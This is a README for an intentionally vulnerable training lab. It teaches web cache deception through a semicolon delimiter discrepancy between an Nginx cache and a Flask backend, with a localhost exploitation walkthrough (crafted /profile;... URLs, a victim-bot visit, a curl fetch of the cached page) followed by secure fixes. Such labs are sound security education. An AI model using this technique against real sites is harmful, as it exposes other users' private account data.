# Lab 02: Web Cache Deception (Delimiter Discrepancy &bull; Semicolon)

- **Vulnerability Category**: Web Cache Deception (WCD)
- **Difficulty**: Intermediate
- **Tech Stack**: Nginx (Reverse Proxy & Cache) + Python Flask / WSGI Middleware + Audit Bot
- **Docker Profile**: `wcd-02`

---

## 📖 Scenario Overview

Following the security incident in **Lab 01**, **NovaCorp** engineers removed subpath routing from `/profile`. If an attacker requests `/profile/avatar.css`, the server strictly returns `404 Not Found`.

However, NovaCorp introduced support for **Matrix Parameters** (parameters separated by a semicolon `;`, such as `/profile;view=summary` or `/profile;theme=dark`), a common pattern in enterprise architectures (Java Spring, Tomcat, Ruby on Rails, and REST gateways).

Your target is Chief Financial Officer **Dr. Alex Mercer** (`victim`). You want to steal their discretionary ledger balance, executive API key, and secret flag.

---

## 🧠 The Root Cause (Developer Mindset)

Delimiter discrepancies occur when the **caching proxy** and the **backend framework** disagree on what characters separate paths from parameters.

```
Request: GET /profile;avatar.css
─────────────────────────────────────────────────────────────────
1. Nginx Cache Proxy:
   - Evaluates URI: `/profile;avatar.css`
   - Does Nginx treat ';' as a path or query delimiter? NO.
   - Regex check: Does the URI end in `.css`? YES!
   - Action: Routes to caching pipeline and prepares to cache the response.

2. Backend WSGI / Framework:
   - Receives: `/profile;avatar.css`
   - Matrix parameter handler detects ';'
   - Splits path into:
       Base Path:      `/profile`
       Matrix Params:  `avatar.css`
   - Action: Executes the `/profile` view for the authenticated user (200 OK)!
   - Fails to emit `Cache-Control: no-store, private`.

3. Result:
   - Nginx stores the victim's private profile under key `GET/profile;avatar.css`.
   - The unauthenticated attacker requests `/profile;avatar.css` and receives the cached profile!
```

---

## ⚡ Exploitation Walkthrough (Hacker Mindset)

### Step 1: Verify the Lab 01 Patch
Log into the application as `attacker` (`attacker123`).
Visit:
```
http://localhost:8081/profile/avatar.css
```
Notice that it returns **`404 Not Found`**. The slash-based subpath technique from Lab 01 is blocked!

### Step 2: Test the Semicolon Delimiter
Now replace the slash `/` with a semicolon `;`:
```
http://localhost:8081/profile;avatar.css
```
Notice that the page renders your **Financial Profile** (`200 OK`)! The backend stripped `;avatar.css` as a matrix parameter.

### Step 3: Trigger the Victim Visit
Generate a unique path to avoid cache collisions:
```
/profile;exec_token_99.css
```
Go to `/report` and submit `/profile;exec_token_99.css`.
The Audit Bot (authenticated as CFO `Dr. Alex Mercer`) reviews the link:
- Nginx misses the cache.
- Flask executes Mercer's profile.
- Nginx saves Mercer's confidential ledger under `/profile;exec_token_99.css`.

### Step 4: Exfiltrate the Executive Flag
In an incognito window or via `curl` (no cookies):
```bash
curl -i http://localhost:8081/profile;exec_token_99.css
```
You will receive:
- `X-Cache-Status: HIT`
- CFO Dr. Alex Mercer's data:
  - **API Key**: `sk-live-mercer-fin-849182390a18294c`
  - **Flag**: `FLAG{wcd_s3m1c0l0n_m4tr1x_d3l1m1t3r_p0wn3d}`

---

## 🛡️ How to Fix (The Secure Solution)

Defense-in-depth is the only reliable mitigation against delimiter discrepancies.

### 1. Fix the Cache Configuration (`nginx.secure.conf`)
Never cache based on file extensions matching across the entire URL space:
```nginx
# Secure: Only cache static files explicitly rooted under /static/
location /static/ {
    proxy_pass http://backend_app;
    proxy_cache lab_cache;
    proxy_cache_valid 200 10m;
    # Honors upstream Cache-Control
}
```

### 2. Fix the Backend Application (`app.py`)
1. Reject unexpected matrix parameters on sensitive dynamic endpoints:
   ```python
   if matrix_params:
       return make_response("Matrix parameters are forbidden on this endpoint.", 400)
   ```
2. Enforce restrictive cache headers:
   ```python
   resp.headers["Cache-Control"] = "no-store, no-cache, private, must-revalidate"
   resp.headers["Pragma"] = "no-cache"
   ```

---

## 🚀 Running and Testing the Lab

### 1. Run via Docker Compose Profile (Root)
```bash
docker compose --profile wcd-02 up --build -d
```
Access the application at [http://localhost:8081](http://localhost:8081).

### 2. Run Standalone (Inside Lab Directory)
```bash
cd labs/01-web-cache-deception/wcd-02-delimiter
docker compose -f docker-compose.lab.yml up --build -d
```

### 3. Run the Automated Exploit Verification
```bash
python labs/01-web-cache-deception/wcd-02-delimiter/exploit.py --url http://127.0.0.1:8081
```

### 4. Switch to Secure Mode
In [.env](file:///c:/Users/DK/Documents/dk/labwork/.env) set:
```ini
WCD02_MODE=secure
```
Restart and test the fix:
```bash
docker compose --profile wcd-02 up --build -d
python labs/01-web-cache-deception/wcd-02-delimiter/exploit.py --url http://127.0.0.1:8081 --expected-mode secure
```
